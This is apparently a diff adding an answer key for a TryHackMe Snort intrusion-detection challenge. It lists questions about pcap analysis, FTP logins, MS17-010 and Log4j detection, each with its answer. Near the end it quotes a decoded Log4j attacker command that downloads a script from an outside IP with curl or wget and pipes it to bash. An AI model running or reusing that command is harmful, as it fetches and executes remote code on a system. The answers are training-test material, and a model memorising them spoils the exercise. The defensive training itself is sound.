@@ -1,0 +1,140 @@
+Snort Challenge - The Basics
+https://tryhackme.com/room/snortchallenges1
+
+Write a rule to detect all TCP packets from or to port 80.
+What is the number of detected packets you got?
+164
+
+What is the destination address of packet 63?
+216.239.59.99
+
+What is the ACK number of packet 64?
+0x2E6B5384
+
+What is the SEQ number of packet 62?
+0x36C21E28
+
+What is the TTL of packet 65?
+128
+
+What is the source IP of packet 65?
+145.254.160.237
+
+What is the source port of packet 65?
+3372
+
+Write a single rule to detect "all TCP port 21"  traffic in the given pcap.
+What is the number of detected packets?
+307
+
+What is the FTP service name?
+Microsoft FTP Service
+
+Write a rule to detect failed FTP login attempts in the given pcap.
+What is the number of detected packets?
+41
+
+Write a rule to detect successful FTP logins in the given pcap.
+What is the number of detected packets?
+1
+
+Write a rule to detect FTP login attempts with a valid username but no password entered yet.
+What is the number of detected packets?
+42
+
+Write a rule to detect FTP login attempts with the "Administrator" username but no password entered yet.
+What is the number of detected packets?
+7
+
+Write a rule to detect the PNG file in the given pcap.
+Investigate the logs and identify the software name embedded in the packet.
+Adobe ImageReady
+
+Write a rule to detect the GIF file in the given pcap.
+Investigate the logs and identify the image format embedded in the packet.
+GIF89a
+
+Write a rule to detect the torrent metafile in the given pcap.
+What is the number of detected packets?
+2
+
+What is the name of the torrent application?
+bittorrent
+
+What is the MIME (Multipurpose Internet Mail Extensions) type of the torrent metafile?
+application/x-bittorrent
+
+What is the hostname of the torrent metafile?
+tracker2.torrentbox.com
+
+Fix the syntax error in local-1.rules file and make it work smoothly.
+What is the number of the detected packets?
+16
+
+Fix the syntax error in local-2.rules file and make it work smoothly.
+What is the number of the detected packets?
+68
+
+Fix the syntax error in local-3.rules file and make it work smoothly.
+What is the number of the detected packets?
+87
+
+Fix the syntax error in local-4.rules file and make it work smoothly.
+What is the number of the detected packets?
+90
+
+Fix the syntax error in local-5.rules file and make it work smoothly.
+What is the number of the detected packets?
+155
+
+Fix the logical error in local-6.rules file and make it work smoothly to create alerts.
+What is the number of the detected packets?
+2
+
+Fix the logical error in local-7.rules file and make it work smoothly to create alerts.
+What is the name of the required option?
+msg
+
+Use the given rule file (local.rules) to investigate the ms1710 exploitation.
+What is the number of detected packets?
+25154
+
+Use local-1.rules empty file to write a new rule to detect payloads containing the "\IPC$" keyword.
+What is the number of detected packets?
+12
+
+Investigate the log/alarm files.
+What is the requested path?
+\\192.168.116.138\IPC$
+
+What is the CVSS v2 score of the MS17-010 vulnerability?
+9.3
+
+Use the given rule file (local.rules) to investigate the log4j exploitation.
+What is the number of detected packets?
+26
+
+How many rules were triggered?.
+4
+
+What are the first six digits of the triggered rule sids?
+210037
+
+Use local-1.rules empty file to write a new rule to detect packet payloads between 770 and 855 bytes.
+What is the number of detected packets?
+41
+
+What is the name of the used encoding algorithm?
+Base64
+
+What is the IP ID of the corresponding packet?
+62808
+
+What is the attacker's command?
+(curl -s 45.155.205.233:5874/162.0.228.253:80||wget -q -O- 45.155.205.233:5874/162.0.228.253:80)|bash
+
+What is the CVSS v2 score of the Log4j vulnerability?
+9.3
+
+---
+If you found this useful, sign up for our monthly newsletter and receive malware analysis reports, cybersecurity threat updates, and tutorials at https://newsletter.uber-techie.co.uk.
